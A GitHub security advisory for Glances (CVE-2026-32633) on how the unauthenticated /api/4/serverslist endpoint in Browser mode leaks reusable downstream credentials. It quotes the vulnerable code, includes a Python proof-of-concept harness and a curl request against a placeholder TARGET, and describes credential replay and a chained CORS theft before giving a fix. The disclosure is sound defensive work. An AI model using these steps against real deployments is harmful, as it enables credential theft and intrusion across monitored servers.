# [C] Glances's Browser API Exposes Reusable Downstream Credentials via `/api/4/serverslist`

## Summary
Severity: Critical
Advisory: GHSA-r297-p3v4-wp8m
CVE: CVE-2026-32633
CWE: CWE-200, CWE-522
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-r297-p3v4-wp8m
Type: github-advisory

## Affected
- PyPI: `Glances` — affected >=0 <4.5.2

## Details
## Summary

In Central Browser mode, the `/api/4/serverslist` endpoint returns raw server objects from `GlancesServersList.get_servers_list()`. Those objects are mutated in-place during background polling and can contain a `uri` field with embedded HTTP Basic credentials for downstream Glances servers, using the reusable pbkdf2-derived Glances authentication secret.

If the front Glances Browser/API instance is started without `--password`, which is supported and common for internal network deployments, `/api/4/serverslist` is completely unauthenticated. Any network user who can reach the Browser API can retrieve reusable credentials for protected downstream Glances servers once they have been polled by the browser instance.

## Details

The Browser API route simply returns the raw servers list:

```python
# glances/outputs/glances_restful_api.py:799-805
def _api_servers_list(self):
    self.__update_servers_list()
    return GlancesJSONResponse(self.servers_list.get_servers_list() if self.servers_list else [])
```

The main API router is only protected when the front instance itself was started with `--password`. Otherwise there are no authentication dependencies at all:

```python
# glances/outputs/glances_restful_api.py:475-480
if self.args.password:
    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])
else:
    router = APIRouter(prefix=self.url_prefix)
```

The Glances web server binds to `0.0.0.0` by default:

```python
# glances/main.py:425-427
parser.add_argument(
    '--bind',
    default='0.0.0.0',
    dest='bind_address',
)
```

During Central Browser polling, server entries are modified in-place and gain a `uri` field:

```python
# glances/servers_list.py:141-148
def __update_stats(self, server):
    server['uri'] = self.get_uri(server)
    ...
    if server['protocol'].lower() == 'rpc':
        self.__update_stats_rpc(server['uri'], server)
    elif server['protocol'].lower() == 'rest' and not import_requests_error_tag:
        self.__update_stats_rest(f"{server['uri']}/api/{__apiversion__}", server)
```

For protected servers, `get_uri()` loads the saved password from the `[passwords]` section (or the `default` password), hashes it, and embeds it directly in the URI:

```python
# glances/servers_list.py:119-130
def get_uri(self, server):
    if server['password'] != "":
        if server['status'] == 'PROTECTED':
            clear_password = self.password.get_password(server['name'])
            if clear_password is not None:
                server['password'] = self.password.get_hash(clear_password)
        uri = 'http://{}:{}@{}:{}'.format(
            server['username'],
            server['password'],
            server['name'],
            server['port'],
        )
    else:
        uri = 'http://{}:{}'.format(server['name'], server['port'])
    return uri
```

Password lookup falls back to a global default:

```python
# glances/password_list.py:55-58
try:
    return self._password_dict[host]
except (KeyError, TypeError):
    return self._password_dict['default']
```

The sample configuration explicitly supports browser-wide default password reuse:

```ini
# conf/glances.conf:656-663
[passwords]
# localhost=abc
# default=defaultpassword
```

The secret embedded in `uri` is not the cleartext password, but it is still a reusable Glances authentication credential. Client connections send that pbkdf2-derived hash over HTTP Basic authentication:

```python
# glances/password.py:72-74,94
# For Glances client, get the password (confirm=False, clear=True):
#     2) the password is hashed with SHA-pbkdf2_hmac (only SHA string transit
password = password_hash
```

```python
# glances/client.py:56-57
if args.password != "":
    self.uri = f'http://{args.username}:{args.password}@{args.client}:{args.port}'
```

The Browser WebUI also consumes that raw `uri` directly and redirects the user to it:

```javascript
// glances/outputs/static/js/Browser.vue:83-103
fetch("api/4/serverslist", { method: "GET" })
...
window.location.href = server.uri;
```

So once `server.uri` contains credentials, those credentials are not just used internally; they are exposed to API consumers and frontend JavaScript.

## PoC

### Step 1: Verified local live proof that server objects contain credential-bearing URIs

The following command executes the real `glances/servers_list.py` update logic against a live local HTTP server that always returns `401`. This forces Glances to mark the downstream server as `PROTECTED` and then retry with the saved/default password. After the second refresh, the in-memory server list contains a `uri` field with embedded credentials.

```bash
cd D:\bugcrowd\glances\repo
@'
import importlib.util
import json
import sys
import threading
import types
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from defusedxml import xmlrpc as defused_xmlrpc

pkg = types.ModuleType('glances')
pkg.__apiversion__ = '4'
sys.modules['glances'] = pkg

client_mod = types.ModuleType('glances.client')
class GlancesClientTransport(defused_xmlrpc.xmlrpc_client.Transport):
    def set_timeout(self, timeout):
        self.timeout = timeout
client_mod.GlancesClientTransport = GlancesClientTransport
sys.modules['glances.client'] = client_mod

globals_mod = types.ModuleType('glances.globals')
globals_mod.json_loads = json.loads
sys.modules['glances.globals'] = globals_mod

logger_mod = types.ModuleType('glances.logger')
logger_mod.logger = types.SimpleNamespace(
    debug=lambda *a, **k: None,
    warning=lambda *a, **k: None,
    info=lambda *a, **k: None,
    error=lambda *a, **k: None,
)
sys.modules['glances.logger'] = logger_mod

password_list_mod = types.ModuleType('glances.password_list')
class GlancesPasswordList: pass
password_list_mod.GlancesPasswordList = GlancesPasswordList
sys.modules['glances.password_list'] = password_list_mod

dynamic_mod = types.ModuleType('glances.servers_list_dynamic')
class GlancesAutoDiscoverServer: pass
dynamic_mod.GlancesAutoDiscoverServer = GlancesAutoDiscoverServer
sys.modules['glances.servers_list_dynamic'] = dynamic_mod

static_mod = types.ModuleType('glances.servers_list_static')
class GlancesStaticServer: pass
static_mod.GlancesStaticServer = GlancesStaticServer
sys.modules['glances.servers_list_static'] = static_mod

spec = importlib.util.spec_from_file_location('tested_servers_list', Path('glances/servers_list.py'))
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
GlancesServersList = mod.GlancesServersList

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        _ = self.rfile.read(int(self.headers.get('Content-Length', '0')))
        self.send_response(401)
        self.end_headers()
    def log_message(self, *args):
        pass

httpd = HTTPServer(('127.0.0.1', 0), Handler)
port = httpd.server_address[1]
thread = threading.Thread(target=httpd.serve_forever, daemon=True)
thread.start()

class FakePassword:
    def get_password(self, host=None):
        return 'defaultpassword'
    def get_hash(self, password):
        return f'hash({password})'

sl = GlancesServersList.__new__(GlancesServersList)
sl.password = FakePassword()
sl._columns = [{'plugin': 'system', 'field': 'hr_name'}]
server = {
    'key': f'target:{port}',
    'name': '127.0.0.1',
    'ip': '203.0.113.77',
    'port': port,
    'protocol': 'rpc',
    'username': 'glances',
    'password': '',
    'status': 'UNKNOWN',
    'type': 'STATIC',
}
sl.get_servers_list = lambda: [server]

sl._GlancesServersList__update_stats(server)
sl._GlancesServersList__update_stats(server)
httpd.shutdown()
thread.join(timeout=2)
print(json.dumps(sl.get_servers_list(), indent=2))
'@ | python -
```

Verified output:

```json
[
  {
    "key": "target:57390",
    "name": "127.0.0.1",
    "ip": "203.0.113.77",
    "port": 57390,
    "protocol": "rpc",
    "username": "glances",
    "password": null,
    "status": "PROTECTED",
    "type": "STATIC",
    "uri": "http://glances:hash(defaultpassword)@127.0.0.1:57390",
    "columns": [
      "system_hr_name"
    ]
  }
]
```

This is the same raw object shape that `/api/4/serverslist` returns.

### Step 2: Remote reproduction on a live Browser instance

1. Configure Glances Browser mode with a saved default password for downstream servers:

```ini
[passwords]
default=SuperSecretBrowserPassword
```

2. Start the Browser/API instance without front-end authentication:

```bash
glances --browser -w -C ./glances.conf
```

3. Ensure at least one protected downstream server is polled and marked `PROTECTED`.

4. From any machine that can reach the Glances Browser API, fetch the raw server list:

```bash
curl -s http://TARGET:61208/api/4/serverslist
```

5. Observe entries like:

```json
{
  "name": "internal-glances.example",
  "status": "PROTECTED",
  "uri": "http://glances:<pbkdf2_hash>@internal-glances.example:61209"
}
```

## Impact

- **Unauthenticated credential disclosure:** When the front Browser API runs without `--password`, any reachable user can retrieve downstream Glances authentication secrets from `/api/4/serverslist`.
- **Credential replay:** The disclosed pbkdf2-derived hash is the effective Glances client secret and can be replayed against downstream Glances servers using the same password.
- **Fleet-wide blast radius:** A single Browser instance can hold passwords for many downstream servers via host-specific entries or `[passwords] default`, so one exposed API can disclose credentials for an entire monitored fleet.
- **Chains with the earlier CORS issue:** Even when the front instance uses `--password`, the permissive default CORS behavior can let a malicious website read `/api/4/serverslist` from an authenticated browser session and steal the same downstream credentials cross-origin.

## Recommended Fix

Do not expose credential-bearing fields in API responses. At minimum, strip `uri`, `password`, and any derived credential material from `/api/4/serverslist` responses and make the frontend derive navigation targets without embedded auth.

```python
# glances/outputs/glances_restful_api.py

def _sanitize_server(self, server):
    safe = dict(server)
    safe.pop('password', None)
    safe.pop('uri', None)
    return safe

def _api_servers_list(self):
    self.__update_servers_list()
    servers = self.servers_list.get_servers_list() if self.servers_list else []
    return GlancesJSONResponse([self._sanitize_server(server) for server in servers])
```

And in the Browser WebUI, construct navigation URLs from non-secret fields (`ip`, `name`, `port`, `protocol`) instead of trusting a backend-supplied `server.uri`.

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-r297-p3v4-wp8m
- https://nvd.nist.gov/vuln/detail/CVE-2026-32633
- https://github.com/nicolargo/glances/commit/879ef8688ffa1630839549751d3c7ef9961d361e
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.2
